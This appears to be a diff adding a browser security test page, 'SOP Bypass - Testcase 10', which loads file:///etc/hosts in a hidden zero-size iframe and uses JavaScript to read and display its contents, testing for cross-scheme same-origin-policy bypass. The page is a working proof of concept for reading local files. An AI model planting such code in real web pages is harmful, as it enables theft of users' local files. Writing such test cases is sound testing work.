@@ -1,0 +1,84 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+<iframe src="file:///etc/hosts" name="myIframe" width="0px" height="0px"></iframe>
+<script>
+
+function myfunction(){
+var myIframe = frames.myIframe;
+var fenster = window.frames[0];
+var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
+var messages=message;
+messages = messages.replace(/#/g, "");
+alert(messages);
+alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
+
+}
+</script>
+
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 10</h3>	
+
+		<div class="main">
+				<p>Cross Scheme data exposure for bypassing SOP</p>
+		</div>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()" /></center>
+
+		
+		</br></br>
+			<div class="note">
+			
+				<p><strong>Note:</strong> <br />
+In case of a cross scheme exposure, the contents of /etc/hosts file would be displayed</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
